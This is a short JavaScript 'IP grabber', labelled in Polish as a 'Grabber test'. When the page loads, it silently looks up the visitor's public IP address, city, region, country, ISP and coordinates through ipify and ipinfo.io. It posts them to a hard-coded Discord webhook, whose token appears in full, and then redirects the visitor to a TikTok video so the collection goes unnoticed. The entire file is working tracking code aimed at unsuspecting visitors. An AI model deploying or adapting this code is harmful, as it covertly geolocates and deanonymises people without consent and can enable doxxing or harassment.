const webhookUrl = 'https://discord.com/api/webhooks/1437159107910959124/lLFmMH0UNisz0j1P-Mev2Ew7dcBjTmBP2MmsaAParqsAz2PL9x6oxJD1ZS04IpTuh8q_';
const redirectUrl = 'https://www.tiktok.com/@fartingchickenman576/video/7568556848639560990';

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    fetch('https://ipinfo.io/' + ip + '/json')
      .then(resp => resp.json())
      .then(ipinfo => {
        const embed = {
          embeds: [{
            title: "Nowe wejście na stronę",
            description: `Adres IP: **${ip}**\nMiasto: ${ipinfo.city || 'Brak'}\nRegion: ${ipinfo.region || 'Brak'}\nKraj: ${ipinfo.country || 'Brak'}\nISP: ${ipinfo.org || 'Brak'}\nLokacja: ${ipinfo.loc || 'Brak'}`,
            color: 5814783,
            footer: { text: "Grabber test by juliu" },
            timestamp: new Date().toISOString()
          }]
        };
        fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(embed)
        });
      })
      .finally(() => {
        window.location.href = redirectUrl;
      });
  });
